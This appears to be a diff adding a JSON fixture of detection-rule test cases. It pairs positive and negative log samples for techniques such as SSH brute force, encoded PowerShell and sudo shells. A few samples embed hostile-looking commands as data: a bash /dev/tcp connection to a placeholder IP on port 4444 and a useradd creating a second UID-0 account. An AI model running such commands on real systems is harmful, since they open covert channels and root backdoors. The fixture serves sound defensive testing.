@@ -1,0 +1,235 @@
+[
+  {
+    "slug": "ssh-brute-force",
+    "id": "00000000-0000-0000-0000-000000000001",
+    "technique": "T1110.001",
+    "positive": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:00Z edge-01 sshd[1200]: Failed password for analyst from 192.0.2.45 port 51000 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:01Z edge-01 sshd[1201]: Failed password for analyst from 192.0.2.45 port 51001 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:02Z edge-01 sshd[1202]: Failed password for analyst from 192.0.2.45 port 51002 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:03Z edge-01 sshd[1203]: Failed password for analyst from 192.0.2.45 port 51003 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:04Z edge-01 sshd[1204]: Failed password for analyst from 192.0.2.45 port 51004 ssh2"
+      }
+    ],
+    "negative": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:00Z edge-01 sshd[1200]: Failed password for analyst from 192.0.2.45 port 51000 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:01Z edge-01 sshd[1201]: Failed password for analyst from 192.0.2.45 port 51001 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:02Z edge-01 sshd[1202]: Failed password for analyst from 192.0.2.45 port 51002 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:03Z edge-01 sshd[1203]: Failed password for analyst from 192.0.2.45 port 51003 ssh2"
+      }
+    ]
+  },
+  {
+    "slug": "powershell-encoded",
+    "id": "00000000-0000-0000-0000-000000000002",
+    "technique": "T1059.001",
+    "positive": [
+      {
+        "source": "sysmon",
+        "sensor": "sysmon-01",
+        "payload": {
+          "EventID": 1,
+          "UtcTime": "2026-11-15 09:02:00",
+          "Computer": "workstation-07",
+          "User": "forge\\morgan",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGQAZQBtAG8A",
+          "RecordID": "1001"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "C:\\Windows\\powershell.exe",
+          "command": "powershell -File inventory.ps1"
+        }
+      }
+    ]
+  },
+  {
+    "slug": "shell-unusual",
+    "id": "00000000-0000-0000-0000-000000000003",
+    "technique": "T1059.004",
+    "positive": [
+      {
+        "source": "auditd",
+        "sensor": "audit-01",
+        "host": "edge-01",
+        "payload": "type=SYSCALL msg=audit(1794733380.123:800): success=yes uid=1001 auid=1001 euid=1001 exe=\"/bin/bash\"\ntype=EXECVE msg=audit(1794733380.123:800): argc=3 a0=\"bash\" a1=\"-c\" a2=\"echo demo >/dev/tcp/192.0.2.9/4444\""
+      }
+    ],
+    "negative": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "/bin/bash",
+          "command": "bash -c uptime"
+        }
+      }
+    ]
+  },
+  {
+    "slug": "scheduled-task",
+    "id": "00000000-0000-0000-0000-000000000004",
+    "technique": "T1053.005",
+    "positive": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "workstation-07",
+          "kind": "process",
+          "process": "C:\\Windows\\System32\\schtasks.exe",
+          "command": "schtasks /create /tn LabTask /tr notepad.exe /sc onlogon",
+          "user": "forge\\morgan"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "C:\\Windows\\schtasks.exe",
+          "command": "schtasks /query"
+        }
+      }
+    ]
+  },
+  {
+    "slug": "account-uid-zero",
+    "id": "00000000-0000-0000-0000-000000000005",
+    "technique": "T1136.001",
+    "positive": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "edge-01",
+          "kind": "process",
+          "process": "/usr/sbin/useradd",
+          "command": "useradd -o -u 0 lab-admin",
+          "user": "analyst"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "/usr/sbin/useradd",
+          "command": "useradd -u 1002 developer"
+        }
+      }
+    ]
+  },
+  {
+    "slug": "sudo-shell",
+    "id": "00000000-0000-0000-0000-000000000006",
+    "technique": "T1548.003",
+    "positive": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash"
+      }
+    ],
+    "negative": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/id"
+      }
+    ]
+  },
+  {
+    "slug": "outbound-port",
+    "id": "00000000-0000-0000-0000-000000000007",
+    "technique": "T1571",
+    "positive": [
+      {
+        "source": "zeek",
+        "sensor": "zeek-01",
+        "host": "workstation-07",
+        "payload": {
+          "ts": 1794733500,
+          "uid": "Cdemo01",
+          "id.orig_h": "10.0.0.7",
+          "id.resp_h": "1.1.1.1",
+          "id.resp_p": 4444,
+          "proto": "tcp",
+          "orig_bytes": 620
+        }
+      }
+    ],
+    "negative": [
+      {
+        "source": "zeek",
+        "sensor": "zeek-01",
+        "host": "workstation-07",
+        "payload": {
+          "ts": 1794733500,
+          "uid": "Cdemo01",
+          "id.orig_h": "10.0.0.7",
+          "id.resp_h": "1.1.1.1",
+          "id.resp_p": 443,
+          "proto": "tcp",
+          "orig_bytes": 620
+        }
+      }
+    ]
+  }
+]
